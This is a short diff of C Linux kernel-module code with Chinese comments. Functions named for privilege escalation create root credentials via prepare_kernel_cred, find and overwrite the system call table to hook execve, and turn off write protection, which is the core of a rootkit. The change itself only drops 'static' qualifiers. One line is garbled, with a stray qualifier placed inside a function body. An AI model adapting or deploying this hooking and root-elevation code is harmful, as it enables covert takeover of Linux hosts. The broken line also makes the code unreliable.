@@ -36,7 +36,7 @@ static __attribute__((unused))
  
 
 // 核心提权逻辑
-static __attribute__((unused)) void hui_elevate_root(void) {
+__attribute__((unused)) void hui_elevate_root(void) {
     struct cred *new_cred;
     if (!current->mm) return; // 排除内核线程
     new_cred = prepare_kernel_cred(NULL);
@@ -56,7 +56,7 @@ static __attribute__((unused)) asmlinkage long hui_hooked_execve_compat(const st
 }
 
 // 初始化 Hook
-static __attribute__((unused)) int hui_hook_init(void) {
+__attribute__((unused)) int hui_hook_init(void) {
     hui_state.sys_call_table = hui_get_sys_call_table();
     if (!hui_state.sys_call_table) return -EFAULT;
 
@@ -75,7 +75,7 @@ static __attribute__((unused)) int hui_hook_init(void) {
 }
 
 // 退出 Hook
-static __attribute__((unused)) void hui_hook_exit(void) {
+__attribute__((unused)) void hui_hook_exit(void) {
 static __attribute__((unused))   if(hui_state.sys_call_table && hui_state.original_execve) {
         hui_disable_wp();
         hui_state.sys_call_table[__NR_execve] = (unsigned long)hui_state.original_execve;
